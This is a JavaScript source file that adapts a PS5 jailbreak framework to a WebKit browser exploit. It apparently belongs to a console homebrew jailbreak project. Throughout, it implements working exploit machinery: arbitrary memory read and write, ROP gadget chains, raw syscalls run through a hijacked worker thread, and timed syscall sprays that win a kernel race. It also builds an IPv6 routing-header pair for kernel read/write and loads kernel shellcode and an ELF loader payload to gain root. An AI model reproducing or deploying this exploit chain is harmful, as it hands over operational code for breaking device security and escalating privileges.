/*
 * p2jb_poops.js — Y2JB framework API implemented on poopsploit primitives.
 *
 * Consumes window.POOPS (published by poops.html right after prepare()):
 *   P.p       : enriched primitive (read1/2/4/8, write1/2/4/8, leakval, malloc,
 *               gadgets{}, syscalls{}, libSceNKWebKitBase, libKernelBase,
 *               libSceLibcInternalBase, array_from_address, writestr, readstr)
 *   P.chain   : worker_rop  (ASYNC .syscall(SYS_n, ...int64) -> int64 result)
 *   P.int64   : 64-bit ctor ; P.toI64(x) coerce
 *   P.log, P.jbmark, P.fw_str
 *
 * Defines the Y2JB globals p2jb.js expects. syscall is ASYNC (poops has no sync
 * path) -> p2jb.js's sync syscall() sites are await-transformed. ROP-chain
 * *construction* stays synchronous (just address arithmetic into a buffer).
 */
(function (G) {
    "use strict";
    var P = G.POOPS;
    if (!P || !P.p) throw new Error("p2jb_poops: window.POOPS not published");
    var p = P.p, int64 = P.int64, toI64 = P.toI64;
    var gad = p.gadgets, sysm = p.syscalls;

    function I(x) { return toI64(x); }
    function toBig(v) {
        if (typeof v === "bigint") return v;
        if (v && typeof v.low !== "undefined")
            return (BigInt((v.hi !== undefined ? v.hi : v.high) >>> 0) << 32n) | BigInt(v.low >>> 0);
        return BigInt(v >>> 0);
    }
    var B = function (x) { return (typeof x === "bigint") ? x : BigInt(x); };

    // dev guard: THROW (not async-beacon) on null/tiny address so the FATAL message
    // itself carries the call site (async marks are lost when the crash follows).
    function chk(a, who) {
        var b = toBig(a);
        if (b < 0x1000n)
            throw new Error("p2jb-A0 " + who + "=0x" + b.toString(16)
                + " st=" + String(new Error().stack || "").replace(/\n/g, " | ").slice(0, 300));
        return a;
    }
    // ---- memory instrumentation (diagnose the OOM). MEM-HB every 15s from whatever
    //      primitive is hot: rw ops during the silent grind, syscalls during feed.
    //      Reports JS heap if this WebKit build exposes performance.memory. ----
    var _ops = 0, _sc = 0, _mN = 0, _mB = 0, _hbLast = 0, _hbBeacon = (P.jbmark || function () { });
    function _hb(where) {
        var t = Date.now();
        if (t - _hbLast < 15000) return;
        _hbLast = t;
        var mem = "";
        try {
            if (window.performance && performance.memory)
                mem = " heapMB=" + (performance.memory.usedJSHeapSize / 1048576).toFixed(1)
                    + "/" + (performance.memory.jsHeapSizeLimit / 1048576).toFixed(0);
        } catch (e) { }
        // MUST be a SYNCHRONOUS beacon. Every syscall goes through fireSync, where the
        // main thread BUSY-SPINS on W.done and never returns to the event loop — so an
        // async/queued beacon can never flush while a chain is in flight. That is why a
        // hung worker produced total silence instead of a FATAL: the heartbeat was
        // queued behind an event loop that never ran again.
        var line = where + " ops=" + _ops + " sc=" + _sc + " mallocN=" + _mN
            + " mallocMB=" + (_mB / 1048576).toFixed(1) + mem + " at=" + new Date().toLocaleTimeString();
        if (typeof G.syncMark === "function") G.syncMark("MEM-HB", line);
        else _hbBeacon("MEM-HB", line);
    }

    // ---- memory: Y2JB read64..read8(byte) -> poops read8(qword)..read1(byte) ----
    G.read64 = function (a) { _ops++; if ((_ops & 0xFFF) === 0) _hb("rw"); return toBig(p.read8(I(chk(a, "r64")))); };
    G.read32 = function (a) { return BigInt(p.read4(I(chk(a, "r32"))) >>> 0); };
    G.read16 = function (a) { return BigInt(p.read2(I(chk(a, "r16"))) & 0xffff); };
    G.read8  = function (a) { return BigInt(p.read1(I(chk(a, "r8"))) & 0xff); };
    G.write64 = function (a, v) { _ops++; if ((_ops & 0xFFF) === 0) _hb("rw"); p.write8(I(chk(a, "w64")), I(v)); };
    G.write32 = function (a, v) { p.write4(I(chk(a, "w32")), Number(toBig(v) & 0xffffffffn)); };
    G.write16 = function (a, v) { p.write2(I(chk(a, "w16")), Number(toBig(v) & 0xffffn)); };
    G.write8  = function (a, v) { p.write1(I(chk(a, "w8")), Number(toBig(v) & 0xffn)); };

    G.read_buffer = function (a, n) {
        n = Number(n); var out = new Uint8Array(n), aa = B(a), i = 0;
        for (; i + 8 <= n; i += 8) { var v = toBig(p.read8(I(aa + B(i)))); for (var j = 0; j < 8; j++) out[i + j] = Number((v >> B(8 * j)) & 0xffn); }
        for (; i < n; i++) out[i] = p.read1(I(aa + B(i))) & 0xff;
        return out;
    };
    G.write_buffer = function (a, buf) {
        var aa = B(a), i = 0;
        for (; i + 8 <= buf.length; i += 8) { var v = 0n; for (var j = 0; j < 8; j++) v |= B(buf[i + j] & 0xff) << B(8 * j); p.write8(I(aa + B(i)), I(v)); }
        for (; i < buf.length; i++) p.write1(I(aa + B(i)), buf[i] & 0xff);
    };

    // ---- allocation ----
    // MUST return BigInt: p2jb.js does raw BigInt address math on malloc results
    // (jmpbuf + 0x40n, buf + k, etc.). poops malloc returns an int64 OBJECT whose
    // toString() is bare hex ("10003c0000", NO 0x) with no valueOf -> `obj + 0x40n`
    // string-concats to "10003c000064" -> Number()=NaN -> >>>0 = 0 -> address 0.
    // toBig() collapses the int64 (.low/.hi) to a proper BigInt. The backing buffer
    // stays alive via main.js's nogc.push, so dropping the object here is GC-safe.
    G.malloc = function (sz) { _mN++; _mB += Number(sz); return toBig(p.malloc(Number(sz), 1)); };
    G.alloc_string = function (s) {
        var bytes = new TextEncoder().encode(String(s));
        var a = toBig(p.malloc(bytes.length + 1, 1));
        for (var i = 0; i < bytes.length; i++) p.write1(I(a + B(i)), bytes[i]);
        p.write1(I(a + B(bytes.length)), 0);
        return a;
    };

    // ---- ROP gadget object (p2jb ROP.xxx -> poops gadgets["..."]) ----
    // Construction is synchronous; addresses are int64 from poops's resolved table.
    G.ROP = {
        get pop_rdi()          { return gad["pop rdi"]; },
        get pop_rsi()          { return gad["pop rsi"]; },
        get pop_rdx()          { return gad["pop rdx"]; },
        get pop_rcx()          { return gad["pop rcx"]; },
        get pop_rax()          { return gad["pop rax"]; },
        get pop_rsp()          { return gad["pop rsp"]; },
        get pop_r8()           { return gad["pop r8"]; },
        get ret()              { return gad["ret"]; },
        get mov_qword_rdi_rax(){ return gad["mov [rdi], rax"]; },
        // generic syscall trampoline (number in rax): prefer a resolved wrapper,
        // else the syscall stub table's shared `syscall; ret`. Poops exposes
        // per-nr stubs; the wrapper address is the syscall instruction itself.
        get syscall_wrapper()  { return gad["syscall"] || (sysm && sysm.wrapper) || gad["ret"]; },
    };

    // ---- syscall numbers (name -> Sony/PS5 nr, BigInt) ----
    // poops's p.syscalls maps name -> libkernel STUB ADDRESS (for jmp-style calls);
    // p2jb needs raw NUMBERS (emit(SYSCALL.x) -> pop rax; syscall). syscalls.js has
    // the SYS_* consts but they're script-scoped (invisible on window), so build the
    // map explicitly from those verified numbers. p2jb overlays SYSCALL_EXTRA only
    // for keys NOT already present -> ours win where they overlap (identical anyway).
    G.SYSCALL = {
        read: 0x003n, write: 0x004n, open: 0x005n, close: 0x006n,
        getpid: 0x014n, getuid: 0x018n, geteuid: 0x019n, setuid: 0x017n, recvmsg: 0x01Bn, ioctl: 0x036n,
        mprotect: 0x04An, fcntl: 0x05Cn, socket: 0x061n, setsockopt: 0x069n,
        getsockopt: 0x076n, readv: 0x078n, writev: 0x079n, socketpair: 0x087n,
        kqueueex: 0x08Dn, setrlimit: 0x0C3n, nanosleep: 0x0F0n,
        sched_yield: 0x14Bn, kqueue: 0x16An, thr_exit: 0x1AFn,
        munmap: 0x049n,
        umtx_op: 0x1C6n, thr_new: 0x1C7n, rtprio_thread: 0x1D2n, mmap: 0x1DDn,
        cpuset_getaffinity: 0x1E7n, cpuset_setaffinity: 0x1E8n,
        jitshm_create: 0x215n, jitshm_alias: 0x216n,
    };

    // ---- create_pipe(): Y2JB framework global. pipe2(fds, 0) -> BLOCKING pipe
    //      (p2jb sets O_NONBLOCK itself via fcntl; the leak worker read-gates on a
    //      BLOCKING rfd, so DON'T bake O_NONBLOCK here). Returns [rfd, wfd] (Numbers).
    G.create_pipe = function () {
        var buf = toBig(p.malloc(0x10, 1));
        p.write4(I(buf), 0); p.write4(I(buf + 4n), 0);
        var r = G.syscall(0x2AFn, buf, 0n);           // SYS_pipe2 = 0x2AF
        if ((toBig(r) & 0xffffffffn) !== 0n)
            throw new Error("create_pipe: pipe2 failed ret=0x" + toBig(r).toString(16));
        var a = p.read4(I(buf)) | 0, b = p.read4(I(buf + 4n)) | 0;
        if (a < 0 || b < 0) throw new Error("create_pipe: bad fds " + a + "," + b);
        return [a, b];
    };
    if (typeof G.O_RDWR === "undefined") G.O_RDWR = 2;   // p2jb refs bare O_RDWR (open /dev/gc)
    // mmap protection + PS5 GPU-mapping bits. p2jb references these BARE (elf_run's
    // mapping step and the GPU debug path), and the Y2JB runtime it was written against
    // supplied them as globals - our adapter never did. Result on the first successful
    // jailbreak: "stage_elfldr: failed: Can't find variable: PROT_READ" AFTER the payload
    // had already been read (397024 bytes) and ipv6_kernel_rw was built. The jailbreak was
    // complete; only the ELF launch died, on a missing constant.
    if (typeof G.PROT_READ === "undefined")  G.PROT_READ  = 0x1;
    if (typeof G.PROT_WRITE === "undefined") G.PROT_WRITE = 0x2;
    if (typeof G.PROT_EXEC === "undefined")  G.PROT_EXEC  = 0x4;
    if (typeof G.GPU_READ === "undefined")   G.GPU_READ   = 0x10;
    if (typeof G.GPU_WRITE === "undefined")  G.GPU_WRITE  = 0x20;
    if (typeof G.MAP_SHARED === "undefined")   G.MAP_SHARED  = 0x1;
    if (typeof G.MAP_PRIVATE === "undefined")  G.MAP_PRIVATE = 0x2;
    if (typeof G.MAP_FIXED === "undefined")    G.MAP_FIXED   = 0x10;
    if (typeof G.MAP_ANONYMOUS === "undefined") G.MAP_ANONYMOUS = 0x1000;
    // PS5-specific. Only used by the GPU/debug-menu dmem path, which is already wrapped in
    // try/catch, but leaving it undefined means that path dies on a ReferenceError rather
    // than on anything meaningful.
    if (typeof G.MAP_NO_COALESCE === "undefined") G.MAP_NO_COALESCE = 0x400000;

    // toHex: Y2JB framework global (used 53x for logging addresses/retvals). Undefined
    // in p2jb.js -> only surfaced now because instrumentation called it unconditionally
    // (originally only reached inside fail()). Handles bigint / poops int64 obj / number.
    G.toHex = function (x) {
        if (typeof x === "bigint") return "0x" + x.toString(16);
        if (x && typeof x.low !== "undefined") return "0x" + toBig(x).toString(16);
        if (typeof x === "number") return "0x" + (x < 0 ? "-" + (-x).toString(16) : x.toString(16));
        return "0x" + String(x);
    };

    // ---- bare framework-global addresses p2jb.js emits into ROP chains ----
    // syscall_wrapper: address of `mov r10,rcx; syscall; ret` (libkernel_web+0x1AE27
    // on 12.00, verified in IDA: it's the tail of the _umtx_op stub, rax supplied by
    // pop rax). SAME address rop-worker resolved as gsysw (proven: pipe2 succeeded).
    // p2jb also does `syscall_wrapper - 0x7` (elf_run) -> the full stub entry
    // `mov rax,imm; mov r10,rcx; syscall; ret`. Per-fw via P2JB_LK (12.40+ = 0x1AE47).
    var _lk = (G.P2JB_LK && G.P2JB_LK[P.fw_str]) || {};
    var _kb = toBig(p.libKernelBase);
    G.syscall_wrapper = _kb + BigInt(_lk.syscall_wrapper || 0x1AE27);
    // PAYLOAD ABI: args[0] must be the sys_dynlib_dlsym(591) STUB, not a generic syscall
    // entry. We load POOPS' elfldr-ps5-1360.elf, and poops builds payload_args as
    //   +0x00 dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM]   <- sets rax=591 ITSELF
    //   +0x08 rwpipe  +0x10 rwpair  +0x18 pipe_addr  +0x20 kdata  +0x28 out
    // p2jb's elf_run instead writes `syscall_wrapper - 0x7`, which sets NO syscall number,
    // so the payload's first symbol resolution would issue a syscall with whatever was in
    // rax - garbage or a crash, AFTER the thread had already started. The other five slots
    // match exactly. POOPS.p.syscalls[] carries the real per-nr stubs (main.js:201), so
    // hand over the genuine one.
    G.P2JB_DLSYM_STUB = (function () {
        try {
            var t = P.p && P.p.syscalls;
            if (t && t[591] !== undefined) return toBig(I(t[591]));
        } catch (e) { }
        return 0n;   // 0 => elf_run falls back to the old value and beacons a warning
    })();
    // p2jb's spawn path (my_init_threading + spawn_leak_worker + elf_run). Its ORIGINAL
    // libc_base+0x58F80/0x58FD0/0x4BF0 are WRONG for this build (0x58F80 = FPU-math code
    // -> spawned thread executed garbage -> SIGILL WebProcess crash at leak start). The
    // real simple _setjmp/_longjmp (rip@0/rsp@0x10/fpu@0x40, IDA-verified) are in
    // libkernel_web; thread create = scePthreadCreate (4-arg). p2jb.js reads these globals.
    G.P2JB_SETJMP = _kb + BigInt(_lk.setjmp || 0x1D3B3);
    G.P2JB_LONGJMP = _kb + BigInt(_lk.longjmp || 0x1D40C);
    G.P2JB_PTHREAD_CREATE = _kb + BigInt(_lk.pthread_create || 0x79B0);
    G.Thrd_create = G.P2JB_PTHREAD_CREATE; // legacy bare-global alias (elf_run reads Thrd_create)
    // thr_exit libkernel stub (`mov rax,0x1AF; mov r10,rcx; syscall; ret`) — a raw
    // thr_new thread has no libc wrapper, so its stack top is filled with this: if the
    // ROP chain ever returns, the thread exits instead of ret'ing into garbage.
    try { G.P2JB_THR_EXIT_STUB = toBig(sysm[0x1AF] || sysm["431"] || 0); } catch (e) { G.P2JB_THR_EXIT_STUB = 0n; }
    // The per-NR libkernel stub map itself. Our ROP `syscall()` runs a RAW syscall insn and
    // stores RAX only - CF is never captured - so a FAILED call returns errno as a small
    // POSITIVE number that looks exactly like a valid fd. That is how jitshm_create=0x5d /
    // jitshm_alias=0x37 were unreadable: 93/55 are plausible fds AND plausible errnos
    // (ENOTCAPABLE / ENOBUFS). These stubs are `mov rax,NR; mov r10,rcx; syscall; jb err;
    // ret` - IDA-verified on libkernel_web - so they DO test CF and return a real -1.
    // Route any call whose success cannot be judged from the value alone through these.
    G.P2JB_SYSSTUB = sysm;
    // libkernel_web base. The kexp shellcode ships with an internal symbol resolver that
    // goes through syscall 0x24f and executes UD2 if any lookup fails; the WebProcess
    // rejects that resolver, so poops fills the shellcode's PIC slots from the firmware
    // profile instead (poops.js:8443-8455) and NOPs the two resolver calls. p2jb does the
    // same, and needs both library bases to compute those absolute addresses.
    G.P2JB_LIBKERNEL_BASE = _kb;
    // scePthreadJoin, so the kexp thread can be joined exactly as poops joins it
    // (STAGE5-DONE joinRet=0 shellcodeRet=0x0 - the only observed 12.00 success).
    G.P2JB_PTHREAD_JOIN = (typeof OFFSET_lk_scePthreadJoin === "number")
        ? _kb + BigInt(OFFSET_lk_scePthreadJoin) : 0n;
    (P.jbmark || function () { })("SPAWN-ADDRS", "kbase=0x" + _kb.toString(16)
        + " setjmp=0x" + G.P2JB_SETJMP.toString(16) + " longjmp=0x" + G.P2JB_LONGJMP.toString(16)
        + " pthread_create=0x" + G.P2JB_PTHREAD_CREATE.toString(16)
        + " sysw=0x" + G.syscall_wrapper.toString(16));
    // GADGET-OFFSET dump (addresses only — NOT bytes: libraries are xotext /
    // execute-only, so reading code via the R/W primitive FAULTS and kills the proc).
    // I subtract the module base offline and disassemble the binary at that rva instead.
    (function dumpGadgetOffsets() {
        var mk = (P.jbmark || function () { });
        var wk = toBig(p.libSceNKWebKitBase);
        try {
            var names = ["ret", "pop rax", "pop rdi", "pop rsi", "pop rdx", "pop rcx",
                "pop r8", "mov [rdi], rax", "pop rsp"];
            var out = "wk=0x" + wk.toString(16);
            for (var gi = 0; gi < names.length; gi++) {
                var a = gad[names[gi]];
                var tag = names[gi].replace(/[\[\], ]/g, "_");
                if (a === undefined || a === null) { out += " " + tag + "=MISS"; continue; }
                var ab = toBig(a);
                out += " " + tag + "=0x" + ab.toString(16) + "(rva=0x" + (ab - wk).toString(16) + ")";
            }
            mk("GADGET-OFF", out);
        } catch (e) { mk("GADGET-OFF-ERR", String(e && e.message)); }
    })();

    // ---- SYNCHRONOUS syscall via rop-worker fireSync (hardware-proven sync path;
    //      p2jb.js stays unchanged, correct race timing). rop-worker.js must be
    //      loaded before this adapter; it uses window.read64/write64 (defined above). ----
    var _rwReady = false;
    function ensureRopWorker() {
        if (_rwReady) return G.rop_worker;
        G.rop_worker = G.rop_worker || window.rop_worker;
        if (!G.rop_worker) throw new Error("p2jb_poops: rop-worker.js not loaded");
        var gg = p.gadgets;
        var G8 = function (nm) { if (gg[nm] === undefined) throw new Error("gadget missing: " + nm); return toBig(gg[nm]); };
        var lk = (G.P2JB_LK && G.P2JB_LK[P.fw_str]) || null; // per-fw libkernel_web offsets (RE'd)
        G.rop_worker.init({
            kernelBase: toBig(p.libKernelBase),
            webkitBase: toBig(p.libSceNKWebKitBase),
            // 0x20000, not 0x8000: rop-worker now reserves 0x10000 BELOW the chain
            // entry for whatever the chain CALLS to push into (poops's rop class has
            // always done this via reserved_stack). With the old 0x8000 the reserve
            // would not fit and compiled-function calls corrupted the jmp_buf.
            scratch: toBig(p.malloc(0x20000, 1)),
            scratchSize: 0x20000,
            gadgets: {                                    // underscore names rop-worker expects
                pop_rdi: G8("pop rdi"), pop_rsi: G8("pop rsi"), pop_rdx: G8("pop rdx"),
                pop_rcx: G8("pop rcx"), pop_r8: G8("pop r8"), pop_rax: G8("pop rax"),
                // pop_r9 = THE 6th SYSCALL ARGUMENT. Without it rop-worker's syscall path
                // caps at 5 args and mmap (addr,len,prot,flags,fd,OFFSET) silently loses
                // its offset -> the kernel sees garbage in r9. sys_mmap requires
                // offset==0 for MAP_ANON (test r12,r12 ; or dl,cl ; jne EINVAL) and
                // 16K-aligned offset otherwise, so EVERY p2jb mmap returned EINVAL(0x16) -
                // MAP_ANON, jitshm create, jitshm alias, MAP_FIXED, all of them.
                // rop-worker.js's header claims "no usable pop r9 anywhere"; that is FALSE
                // for the poops gadget set, which has had one all along
                // (offsets/12.00.js: "pop r9": 0x000FFFF6). Proven by poops itself:
                // its own stage5 does mmap(0,0x64000,3,0x1002,-1,0) -> 0x2004c4000 OK.
                pop_r9: G8("pop r9"),
                mov_qword_rdi_rax: G8("mov [rdi], rax"),
                // WEBKIT pop rsp: `5C C3` was removed from libkernel_web in 12.xx, so
                // rop-worker's kbase pop_rsp is unavailable there. libSceNKWebKit still
                // has one (verified 12.00-12.70). rop-worker g() prefers this.
                pop_rsp: G8("pop rsp"),
            },
            lk: lk || {},                                 // {} -> rop-worker's 10.00 defaults (wrong on 12.xx)
        });
        // Reuse poops's already-parked rop_slave.js worker + its 0x80000 stack instead of
        // spawnWorker() (a 2nd 0x80000 stack would make findWorkerStack ambiguous). W.worker
        // is postMessaged to wake it; W.stack is where the hijack slot lives — same worker.
        if (P.worker) G.rop_worker.state.worker = P.worker;
        if (P.worker_stack !== undefined && P.worker_stack !== null)
            G.rop_worker.state.stack = toBig(P.worker_stack);
        _rwReady = true;
        // PIN THE EXECUTOR WORKER TO A FREE CORE (fixes "page stopped loading").
        // p2jb pins 4 leak workers to cores 0-3 (100% CPU) and the MAIN thread to core 4
        // at RT prio 256. The poops rop_slave worker that fireSync depends on was UNPINNED,
        // so the scheduler could place it on a saturated core -- or on core 4, where the
        // RT main thread busy-spins 20M iterations waiting for it => priority inversion,
        // worker never gets CPU, main never returns to the event loop => WebKit hang
        // watchdog. Non-deterministic placement = the random death points we saw.
        // syscallSync runs the chain ON THE WORKER, so CPU_WHICH_TID/-1 pins the worker.
        // FIRST: read the PROCESS-level allowed CPU mask (cpuset_getaffinity, CPU_WHICH_PID).
        // Sony restricts WebProcess to a core subset; p2jb hardcodes leak cores 0-3 + main 4,
        // which can oversubscribe every allowed core and starve the unpinned JS main thread.
        // No guessing — p2jb derives its core plan from this real mask (P2JB_ALLOWED_CORES).
        try {
            var amsk = toBig(p.malloc(0x20, 1));
            p.write8(I(amsk), I(0n)); p.write8(I(amsk + 8n), I(0n));
            var gr = G.rop_worker.syscallSync(0x1E7, 3n, 2n, 0xFFFFFFFFFFFFFFFFn, 0x10n, amsk);
            var bits = toBig(p.read8(I(amsk))), cores = [];
            for (var c = 0; c < 16; c++) if ((bits >> BigInt(c)) & 1n) cores.push(c);
            G.P2JB_ALLOWED_CORES = cores;
            (P.jbmark || function () { })("CPU-MASK", "ret=0x" + toBig(gr.retval).toString(16)
                + " mask=0x" + bits.toString(16) + " cores=[" + cores.join(",") + "] n=" + cores.length);
        } catch (e) { (P.jbmark || function () { })("CPU-MASK-ERR", String(e && e.message).slice(0, 80)); }
        P.log("[p2jb_poops] rop-worker SYNC executor init fw=" + P.fw_str
            + (lk ? " (lk offsets loaded)" : " (LK OFFSETS MISSING -> defaults, needs per-fw RE)"));
        return G.rop_worker;
    }

    // SIX args - see the pop_r9 note in the gadget map. mmap needs its offset in r9 and
    // this wrapper used to drop it silently, so every p2jb mmap got EINVAL.
    G.syscall = function (nr, a, b, c, d, e, f) {
        var rw = ensureRopWorker();
        var num = Number(typeof nr === "bigint" ? nr : (nr && nr.low !== undefined ? toBig(nr) : nr));
        _sc++; _hb("sc:0x" + num.toString(16));
        var A = [a, b, c, d, e, f].map(function (x) { return x === undefined ? undefined : toBig(I(x)); });
        var r = rw.syscallSync(num, A[0], A[1], A[2], A[3], A[4], A[5]);
        return toBig(r.retval);
    };
    // BATCHED syscalls — the fix for the stage0 race. One fireSync round trip runs N
    // syscalls, so an rthdr spray lands in ~1ms instead of ~65ms AND every call in the
    // batch executes on the SAME core in one worker wake (no park/migrate between
    // syscalls), so a freed chunk in that core's per-CPU UMA bucket is reclaimed by the
    // same-core spray. Per-call fireSync could never win this race.
    G.syscallBatch = function (calls) {
        var rw = ensureRopWorker(); _sc += calls.length; _hb("batch");
        return rw.syscallBatch(calls);
    };
    G.syscallBatchTagged = function (items, num, a2, a3, a4, a5) {
        var rw = ensureRopWorker(); _sc += items.length; _hb("sprayN");
        return rw.syscallBatchTagged(items, num, a2, a3, a4, a5);
    };
    G.leadThenBatchTagged = function (lead, items, num, a2, a3, a4, a5) {
        var rw = ensureRopWorker(); _sc += items.length + 1; _hb("freeSpray");
        return rw.leadThenBatchTagged(lead, items, num, a2, a3, a4, a5);
    };

    G.call = function (fn, a, b, c, d, e) {
        var rw = ensureRopWorker();
        var A = [a, b, c, d, e].map(function (x) { return x === undefined ? undefined : toBig(I(x)); });
        // native call = same chain shape as syscall but jmp to fn instead of syscall_wrapper
        var r = rw.fireSync(function (ch) {
            var regs = ["rdi", "rsi", "rdx", "rcx", "r8"];
            for (var i = 0; i < 5; i++) if (A[i] !== undefined) ch.pop(regs[i], A[i]);
            ch.call(toBig(I(fn)));
            ch.pop("rdi", rw.state.retval).raw(rw.state.gadgets ? rw.state.gadgets.mov_qword_rdi_rax : 0n);
        });
        return toBig(r.retval);
    };

    // ---- logging / env ----
    // Route through jbmark (the beacon), NOT P.log: main.js is a plain script so
    // `log` is a GLOBAL (window.log); assigning G.log/G.ulog here overwrites it,
    // and P.log re-resolves the global -> infinite recursion. jbmark is separate.
    var beacon = (typeof P.jbmark === "function") ? P.jbmark : function () { };
    G.ulog = function (m) { beacon("p2jb", String(m)); };            // sync; `await ulog(..)` tolerates non-promise
    G.log  = function (m) { beacon("p2jb", String(m)); };
    G.send_notification = function (m) { beacon("p2jb", String(m).replace(/\n/g, " | ")); };
    G.FW_VERSION = P.fw_str || "";
    G.libc_base  = toBig(p.libSceLibcInternalBase);
    // REAL check, not a UI flag. This used to return !!(window.jb && window.jb.done) - a
    // host-UI flag that p2jb NEVER sets - so it reported false even on a fully successful
    // jailbreak ("stage6: is_jailbroken() = false" while stage5 and stage7 both succeeded).
    // A verdict beacon that lies is worse than none: it is exactly what misleads the next
    // session. uid 0 is the actual evidence of priv-esc.
    // Used in two places and correct for both: the startup guard (a process already rooted
    // this boot should skip) and the stage6 report.
    G.is_jailbroken = function () {
        try {
            return (Number(toBig(G.syscall(G.SYSCALL.getuid)) & 0xFFFFFFFFn) === 0);
        } catch (e) { return false; }
    };
    G.get_title_id  = function () { return "P2JBWEBK"; };

    // ---- stage-7 (elfldr) helpers. p2jb's preflight (p2jb.js:2282) requires these
    //      DEFINED before running any stage, but they're only USED after jailbreak
    //      (stages 0-5 use p2jb's own pipe krw). Stubs pass the preflight; real
    //      impls are the elfldr milestone. Throw loudly if reached. ----
    // Y2JB framework globals used only for p2jb's optional "failcheck" breadcrumb file
    // (p2jb.js:2675 sets failcheck_path = "/" + get_nidpath() + "/common_temp/p2jb.fail").
    // Undefined here, they would throw in a LATE stage for a pure diagnostic. The sandbox
    // dir is the NID-looking path seen in module names (UART: /dlkPfNCHKG/common/lib/...);
    // we do not need the real one, so keep the breadcrumb a no-op rather than risk a throw.
    G.get_nidpath = function () { return "dev"; };
    G.write_file = function (path, data) {
        (P.jbmark || function () { })("WRITE-FILE-STUB", String(path).slice(0, 60)
            + " len=" + (data ? String(data).length : 0) + " (no-op: diagnostic only)");
        return 0;
    };
    // ---- stage 7 (elfldr) support ------------------------------------------------
    // p2jb expects a Y2JB host filesystem (USB / app dir). We have something better: we
    // ARE the web host, so serve the payload over the same origin and read it with a
    // SYNCHRONOUS XHR (read_file is called synchronously). The x-user-defined charset
    // trick preserves every byte 1:1 through responseText.
    G.P2JB_ELF_URL = "payloads/elfldr-ps5-1360.elf";
    // The KERNEL SHELLCODE that actually starts elfldr on 12.00. poops's main.js loader
    // (userland thread at the ELF's own entry + a 6-field payload_args) is the 10.00 path
    // and has NEVER been observed to run on this firmware: instrumenting
    // execute_elf_store with a PARGS beacon produced ZERO lines on a successful 12.00
    // poops run, because poops.html's harness ladder never calls it. What runs is
    // poops.js stage5, which hands THIS shellcode the elfldr ELF as a raw data blob.
    G.P2JB_KEXP_URL = "payloads/kexp_2026_05_25.bin";
    G.file_exists = function (path) {
        // report the elfldr as present so stage_elfldr proceeds to read_file
        return /elfldr/i.test(String(path)) || /kexp/i.test(String(path));
    };
    G.read_file = function (path) {
        var url = /kexp/i.test(String(path)) ? G.P2JB_KEXP_URL
            : /elfldr/i.test(String(path)) ? G.P2JB_ELF_URL : String(path);
        var x = new XMLHttpRequest();
        x.open("GET", url, false);
        try { x.overrideMimeType("text/plain; charset=x-user-defined"); } catch (e) { }
        x.send();
        if (x.status && x.status !== 200)
            throw new Error("read_file: HTTP " + x.status + " for " + url);
        var s = x.responseText, out = new Uint8Array(s.length);
        for (var i = 0; i < s.length; i++) out[i] = s.charCodeAt(i) & 0xff;
        (P.jbmark || function () { })("ELF-READ", url + " -> " + out.length + " bytes"
            + " magic=" + out[0].toString(16) + out[1].toString(16) + out[2].toString(16) + out[3].toString(16));
        return out;
    };
    // p2jb assigns kernel.addr.data_base before spawning the payload.
    G.kernel = { addr: { data_base: 0n } };
    // ipv6_kernel_rw: builds the master/victim IPv6 socket pair the elfldr payload uses
    // for its own kernel R/W (payload_args rwpair). Verified against poops's proven
    // launch in main.js, which fills the identical ABI:
    //   +0x00 dlsym  +0x08 rwpipe  +0x10 rwpair  +0x18 kpipe_addr  +0x20 kdata  +0x28 out
    // Construction is the classic rthdr trick: point master's ip6po_rthdr at victim's
    // ip6po_rthdr FIELD, so setsockopt(master) rewrites victim's rthdr pointer and
    // get/setsockopt(victim) then read/write arbitrary kernel memory.
    // NOTE: only reachable after stage3 krw exists; p2jb passes its own kread/kwrite in.
    G.ipv6_kernel_rw = {
        data: {},
        init: function (fd_ofiles, kread64, kwrite64) {
            var mk = (P.jbmark || function () { });
            var OFF = G.P2JB_KRW_OFF || { FILEDESCENT_SIZE: 0x30n, SO_PCB: 0x18n,
                                          INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n };
            function sock() {
                var fd = G.syscall(G.SYSCALL.socket, 28n, 2n, 0n);
                if ((toBig(fd) & 0xFFFFFFFFn) === 0xFFFFFFFFn)
                    throw new Error("ipv6_kernel_rw: socket() failed");
                return Number(toBig(fd) & 0xFFFFFFFFn);
            }
            function pktopts_of(fd) {
                var fp = kread64(toBig(fd_ofiles) + BigInt(fd) * OFF.FILEDESCENT_SIZE);
                if (!fp) throw new Error("ipv6_kernel_rw: no file for fd " + fd);
                var so = kread64(fp);
                var pcb = kread64(so + OFF.SO_PCB);
                var po = kread64(pcb + OFF.INPCB_PKTOPTS);
                if (!po) throw new Error("ipv6_kernel_rw: no pktopts for fd " + fd);
                return po;
            }
            var master = sock(), victim = sock();
            // allocate pktopts on both by setting a routing header
            var buf = toBig(p.malloc(0x100, 1));
            p.write1(I(buf), 0); p.write1(I(buf + 1n), 6); p.write1(I(buf + 2n), 0); p.write1(I(buf + 3n), 3);
            G.syscall(G.SYSCALL.setsockopt, BigInt(master), 41n, 51n, buf, 0x38n);
            G.syscall(G.SYSCALL.setsockopt, BigInt(victim), 41n, 51n, buf, 0x38n);
            var mpo = pktopts_of(master), vpo = pktopts_of(victim);
            // master's rthdr pointer -> victim's rthdr FIELD  => arbitrary R/W for the payload
            kwrite64(mpo + OFF.IP6PO_RTHDR, vpo + OFF.IP6PO_RTHDR);
            this.data = {
                master_sock: master, victim_sock: victim,
                pipe_read_fd: G.P2JB_KRW_PIPE ? G.P2JB_KRW_PIPE[0] : 0,
                pipe_write_fd: G.P2JB_KRW_PIPE ? G.P2JB_KRW_PIPE[1] : 0,
                pipe_addr: G.P2JB_KRW_PIPE_ADDR || 0n,
                master_pktopts: mpo, victim_pktopts: vpo,
            };
            mk("IPV6KRW", "master=" + master + " victim=" + victim
                + " mpo=0x" + mpo.toString(16) + " vpo=0x" + vpo.toString(16));
            return this.data;
        },
        read_buffer: function () { throw new Error("ipv6_kernel_rw.read_buffer: payload-side only"); },
        write_buffer: function () { throw new Error("ipv6_kernel_rw.write_buffer: payload-side only"); },
    };

    // EAGER init: ensureRopWorker() reads the process CPU mask into P2JB_ALLOWED_CORES.
    // It used to run lazily on the first syscall — which happens INSIDE p2jb.js, i.e.
    // after p2jb.js's core planner had already fallen back to hardcoded cores. Doing it
    // here (adapter loads before p2jb.js) means the planner sees the real mask.
    try { ensureRopWorker(); } catch (e) {
        (P.jbmark || function () { })("EAGER-INIT-ERR", String(e && e.message).slice(0, 90));
    }
